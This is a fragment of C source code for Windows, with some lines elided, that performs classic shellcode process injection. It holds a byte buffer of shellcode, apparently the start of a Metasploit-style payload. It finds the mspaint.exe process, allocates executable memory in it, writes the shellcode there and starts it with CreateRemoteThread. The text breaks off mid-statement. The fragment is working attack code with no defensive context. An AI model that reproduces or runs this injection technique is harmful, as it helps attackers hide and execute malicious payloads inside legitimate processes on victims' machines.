...
int main() {
	unsigned char buf[] = "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
	...
	while (Process32Next(snapshot, &p32)) {
		if (wcscmp(p32.szExeFile, L"mspaint.exe") != 0) continue;

		void* hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, p32.th32ProcessID);

		void* mem = VirtualAllocEx(hProcess, 0, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (mem == 0) {
			printf("Failed to allocate memory\n");
			return 1;
		}
		printf("Allocate mem at %p\n", mem);
		WriteProcessMemory(hProcess, mem, buf, sizeof(buf), 0);

		void* hThread = CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)mem, 0, 0, 0);
		if (hThread == 0) {
